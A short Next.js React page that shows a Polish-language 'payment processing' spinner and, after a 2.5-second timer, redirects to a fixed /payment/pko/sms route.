// app/payment/[bank]/processing/page.tsx
"use client";

import { useEffect } from "react";
import { useRouter } from "next/navigation";
import "../../../styles/bank-flow.css";

export default function BankProcessingPage() {
  const router = useRouter();

  useEffect(() => {
    const timer = setTimeout(() => {
      router.replace(
        `/payment/pko/sms`
      );
    }, 2500);

    return () => clearTimeout(timer);
  }, [router]);

  return (
    <div className="bank-processing-page">
      <div className="bank-processing-card">
        <div className="bank-spinner" />
        <p>Trwa przetwarzanie płatności…</p>
      </div>
    </div>
  );
}
